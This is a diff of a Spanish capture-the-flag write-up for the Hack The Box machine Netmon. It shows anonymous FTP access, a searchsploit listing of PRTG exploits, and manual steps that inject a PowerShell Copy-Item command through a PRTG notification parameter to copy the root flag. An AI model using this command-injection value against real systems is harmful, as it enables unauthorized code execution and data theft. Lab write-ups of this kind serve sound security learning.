@@ -124,7 +124,7 @@ Extraigo la información relevante:
 
 #FTP
 
-```ftp
+```bash
 ❯ ftp 10.10.10.152
 Connected to 10.10.10.152.
 220 Microsoft FTP Service
@@ -147,6 +147,9 @@ ftp> ls
 ftp> cd Users
 250 CWD command successful.
 
+-----------------------------------------------------
+-----------------------------------------------------
+
 ftp> ls
 200 PORT command successful.
 c125 Data connection already open; Transfer starting.
@@ -155,6 +158,9 @@ c125 Data connection already open; Transfer starting.
 226 Transfer complete.
 ftp> cd Public
 250 CWD command successful.
+
+-----------------------------------------------------
+-----------------------------------------------------
 
 ftp> ls
 200 PORT command successful.
@@ -167,6 +173,9 @@ ftp> ls
 07-16-16  09:18AM       <DIR>          Videos
 226 Transfer complete.
 
+-----------------------------------------------------
+-----------------------------------------------------
+
 ftp> get user.txt
 local: user.txt remote: user.txt
 200 PORT command successful.
@@ -175,7 +184,6 @@ local: user.txt remote: user.txt
 34 bytes received in 0.27 secs (0.1213 kB/s)
 ```
 He podido obtener el archivo user.txt... mmm algo fácil no? Eso me quiere decir que obtener el root va a ser un proceso largo y complejo.
-
 
 Ahora toca obtener el root.txt 
 
@@ -222,14 +230,14 @@ Asique ya que tenemos credenciales busco alguna vulnerabilidad para explotar.
 
 ```bash
 ❯ searchsploit PRTG
--------------------------------------------------------- ---------------------------------
- Exploit Title                                          |  Path
--------------------------------------------------------- ---------------------------------
-PRTG Network Monitor 18.2.38 - (Authenticated) Remote C | windows/webapps/46527.sh
-PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS   | windows/webapps/49156.txt
-PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (D | windows_x86/dos/44500.py
-PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting | java/webapps/34108.txt
--------------------------------------------------------- ---------------------------------
+-------------------------------------------------------- 
+ Exploit Title                                          | 
+-------------------------------------------------------- 
+PRTG Network Monitor 18.2.38 - (Authenticated) Remote C | 
+PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS   | 
+PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (D | 
+PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting | 
+-------------------------------------------------------- 
 ```
 
 Tenemos varios, utilizé uno de ellos pero me daba errores asique encontré un post donde explicaba como hacerlo de forma manual.
@@ -238,15 +246,18 @@ Tenemos varios, utilizé uno de ellos pero me daba errores asique encontré un p
 
 Seguimos estos pasos:
 
-1. Nos dirigimos al panel de la web y vamos a Account > Notificaciones > Y añadimos una nueva notificación.
+1. Nos dirigimos al panel y vamos a Account > Notificaciones > Añadimos una nueva notificación.
 
 2. Nos desplazamos hacia abajo y hacemos click en la opción Execute Program y en Program File seleccionamos la opción con extensión .bat
 
-3. En el parámetro escribiremos lo siguiente --> `elc4br4.txt; Copy-Item 'C:\Users\Administrator\Desktop\root.txt' -Destination 'C:\Users\Public\elc4br4.txt' -Recurse `
+3. En el parámetro escribiremos lo siguiente:
+```powershell
+elc4br4.txt; Copy-Item 'C:\Users\Administrator\Desktop\root.txt' -Destination 'C:\Users\Public\elc4br4.txt' -Recurse
+```
 
 ![](/assets/images/HTB/Netmon-HackTheBox/web4.png)
 
-Ahora accedemos al servidor ftp y podremos leer la bandera root.
+Ahora accedemos al servidor ftp y podremos leer la flag root.
 
 ![](/assets/images/HTB/Netmon-HackTheBox/ftp2.png)
 
